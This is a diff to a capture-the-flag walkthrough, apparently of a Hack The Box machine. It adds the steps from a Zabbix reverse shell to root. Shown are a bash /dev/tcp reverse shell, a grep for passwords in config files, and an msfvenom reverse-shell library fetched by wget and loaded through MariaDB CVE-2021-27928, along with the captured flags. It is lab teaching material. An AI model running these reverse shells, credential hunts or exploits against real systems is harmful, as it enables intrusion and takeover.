@@ -147,7 +147,7 @@ system.run[/bin/bash -c "/bin/bash -i >& /dev/tcp/10.10.15.6/1337 0>&1",nowait]
 ````
 
 ````shell
-root@kali:~/Desktop/shibboleth# nc -nlvp 1337
+root@kali:~/Desktop/shibboleth# rlwrap nc -nlvp 1337
 listening on [any] 1337 ...
 connect to [10.10.15.6] from (UNKNOWN) [10.10.11.124] 33844
 bash: cannot set terminal process group (884): Inappropriate ioctl for device
@@ -158,6 +158,117 @@ uid=110(zabbix) gid=118(zabbix) groups=118(zabbix)
 
 ````
 
+# User
 
+````shell
+su ipmi-svc
+Password: ilovepumkinpie1
+pwd
+/home/ipmi-svc
+id
 
+uid=1000(ipmi-svc) gid=1000(ipmi-svc) groups=1000(ipmi-svc)
+ls -lah
+total 32K
+drwxr-xr-x 3 ipmi-svc ipmi-svc 4.0K Oct 16 12:23 .
+drwxr-xr-x 3 root     root     4.0K Oct 16 12:24 ..
+lrwxrwxrwx 1 ipmi-svc ipmi-svc    9 Apr 27  2021 .bash_history -> /dev/null
+-rw-r--r-- 1 ipmi-svc ipmi-svc  220 Apr 24  2021 .bash_logout
+-rw-r--r-- 1 ipmi-svc ipmi-svc 3.7K Apr 24  2021 .bashrc
+drwx------ 2 ipmi-svc ipmi-svc 4.0K Apr 27  2021 .cache
+lrwxrwxrwx 1 ipmi-svc ipmi-svc    9 Apr 28  2021 .mysql_history -> /dev/null
+-rw-r--r-- 1 ipmi-svc ipmi-svc  807 Apr 24  2021 .profile
+-rw-r----- 1 ipmi-svc ipmi-svc   33 Feb 26 21:08 user.txt
+-rw-rw-r-- 1 ipmi-svc ipmi-svc   22 Apr 24  2021 .vimrc
+cat user.txt
+25aab26618d0d06d2867aa430dc3c5fc
+````
+
+# Root
+
+````shell
+$ grep -iR 'password' /etc/zabbix/ 2>/dev/null
+/etc/zabbix/zabbix_server.conf.dpkg-dist:### Option: DBPassword
+/etc/zabbix/zabbix_server.conf.dpkg-dist:#      Database password.
+/etc/zabbix/zabbix_server.conf.dpkg-dist:#      Comment this line if no password is used.
+/etc/zabbix/zabbix_server.conf.dpkg-dist:# DBPassword=
+/etc/zabbix/zabbix_server.conf:### Option: DBPassword
+/etc/zabbix/zabbix_server.conf:#        Database password.
+/etc/zabbix/zabbix_server.conf:#        Comment this line if no password is used.
+/etc/zabbix/zabbix_server.conf:DBPassword=bloooarskybluh
+````
+Zabbix DBPassword -> bloooarskybluh
+
+````
+$ python3.8 -c "import pty; pty.spawn('/bin/bash')"
+
+$ mysql -u zabbix -p -D zabbix
+bloooarskybluh
+
+Reading table information for completion of table and column names
+You can turn off this feature to get a quicker startup with -A
+
+Welcome to the MariaDB monitor.  Commands end with ; or \g.
+Your MariaDB connection id is 609
+Server version: 10.3.25-MariaDB-0ubuntu0.20.04.1 Ubuntu 20.04
+
+Copyright (c) 2000, 2018, Oracle, MariaDB Corporation Ab and others.
+
+Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.
+
+MariaDB [zabbix]> 
+
+````
+:new: 10.3.25-MariaDB-0ubuntu0.20.04.1 => [CVE-2021-27928](https://packetstormsecurity.com/files/162177/MariaDB-10.2-Command-Execution.html)
+
+````shell
+$ msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.10.15.6 LPORT=7331 -f elf-so -o CVE-2021-27928.so
+[-] No platform was selected, choosing Msf::Module::Platform::Linux from the payload
+[-] No arch selected, selecting arch: x64 from the payload
+No encoder specified, outputting raw payload
+Payload size: 74 bytes
+Final size of elf-so file: 476 bytes
+Saved as: CVE-2021-27928.so
+````
+
+````
+$ rlwrap nc -nlvp 7331
+````
+
+````
+$ python3 -m http.server
+$ wget 10.10.15.6:8000/CVE-2021-27928.so -O CVE-2021-27928.so
+````
+
+````
+$ mysql -u zabbix -p -D zabbix -h 127.0.0.1 -e 'SET GLOBAL wsrep_provider="/tmp/.../CVE-2021-27928.so";'
+<LOBAL wsrep_provider="/tmp/.../CVE-2021-27928.so";'
+bloooarskybluh
+
+ERROR 2013 (HY000) at line 1: Lost connection to MySQL server during query
+````
+
+````
+root@kali:~/Desktop/shibboleth# rlwrap nc -nlvp 7331
+listening on [any] 7331 ...
+connect to [10.10.15.6] from (UNKNOWN) [10.10.11.124] 54714
+id
+uid=0(root) gid=0(root) groups=0(root)
+pwd
+/var/lib/mysql
+cd 
+pwd
+/var/lib/mysql
+cd /root
+ls
+root.txt
+scripts
+cat root.txt
+6fd689a1e529fe27a6abfcd3861a710e
+````
+
+# Secrets
+
+* FLAG_USER = 25aab26618d0d06d2867aa430dc3c5fc
+* FLAG_ROOT = 6fd689a1e529fe27a6abfcd3861a710e
 
